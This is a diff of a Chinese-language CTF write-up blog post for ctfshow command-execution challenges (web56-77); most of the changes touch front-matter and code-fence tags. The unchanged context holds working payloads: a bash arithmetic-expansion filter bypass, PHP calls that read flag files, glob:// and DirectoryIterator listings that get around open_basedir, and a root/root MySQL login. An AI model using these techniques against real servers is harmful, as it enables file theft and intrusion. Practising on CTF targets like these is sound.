@@ -2,18 +2,35 @@
 title: "ctfshow Web入门[命令执行] web56-77 Writeup"
 date: 2022-08-09T17:56:28+08:00
 draft: false
-tags: ['linux','php','ctf']
-categories: ['web']
 author: "X1r0z"
 
-# weight: 1  # Top page
+tags: ['linux','php','ctf']
+categories: ['web']
 
-# You can also close(false) or open(true) something for this content.
-# P.S. comment can only be closed
-comment: false
-toc: false
-autoCollapseToc: false
+hiddenFromHomePage: false
+hiddenFromSearch: false
+twemoji: false
+lightgallery: true
+ruby: true
+fraction: true
+fontawesome: true
+linkToMarkdown: true
+rssFullText: false
+
+toc:
+  enable: true
+  auto: true
+code:
+  copy: true
+  maxShownLines: 50
+math:
+  enable: false
+share:
+  enable: true
+comment:
+  enable: true
 ---
+
 
 剩下来的命令执行
 
@@ -41,7 +58,7 @@ autoCollapseToc: false
 
 hint 如下
 
-```
+```bash
 $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
 ${_} ="" //返回上一次命令
 $((${_}))=0
@@ -50,7 +67,7 @@ $((~$((${_}))))=-1
 
 双小括号的介绍 [http://c.biancheng.net/view/2480.html](http://c.biancheng.net/view/2480.html)
 
-```
+```bash
 exp10it@LAPTOP-TBAF1QQG:~$ echo $(())
 0
 exp10it@LAPTOP-TBAF1QQG:~$ echo $((~$(())))
@@ -69,14 +86,14 @@ exp10it@LAPTOP-TBAF1QQG:~$ echo $((1 1))
 
 这里的-1有点特殊, 因为类似 `$((1 1))` 的命令是错误的 (没有运算符号), 而两个-1并在一起 `$((-1 -1))` 会让 shell 认为是 `$((-1-1))` 即-1减去1, 然后得到-2
 
-```
+```bash
 exp10it@LAPTOP-TBAF1QQG:~$ echo $((~36))
 -37
 ```
 
 36的取反结果是-37, 就是说我们需要通过-1来构造出-37, 然后再取反一次
 
-```
+```bash
 $((~$(($((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(()))) $((~$(())))))))
 ```
 
@@ -100,7 +117,7 @@ http://8eba4c63-5365-45f7-9c6b-7a0d556e22f7.challenge.ctf.show/?c=$((~$(($((~$((
 
 payload 如下
 
-```
+```php
 echo file_get_contents('flag.php')
 echo fread(fopen('flag.php','r'),filesize('flag.php'))
 highlight_file('flag.php')
@@ -192,7 +209,7 @@ index.php 附件
 
 使用 `scandir() + glob://` 列目录, 不过 glob:// 协议还是有限制, 子目录就不能列了
 
-```
+```php
 var_export(scandir('glob://*'));die(); # open_basedir 允许的目录
 var_export(scandir('glob:///*'));die(); # 根目录 /
 ```
@@ -261,7 +278,7 @@ Backtrace UAF # PHP 7.0-7.4
 
 换成 DirectoryIterator
 
-```
+```php
 $a = new DirectoryIterator("glob:///*");
 foreach($a as $f){
     echo($f->__toString().'<br>');
@@ -281,7 +298,7 @@ flag 在 /flag36.txt, include 包含失败, 存在 open_basedir 限制
 
 hint 提示是 mysql 弱口令连接, 用 `load_file()` 读文件...(???)
 
-```
+```php
 $dbh = new PDO('mysql:host=127.0.0.1;dbname=mysql','root','root');
 foreach ($dbh->query('show databases;') as $row){
 	var_export($row);
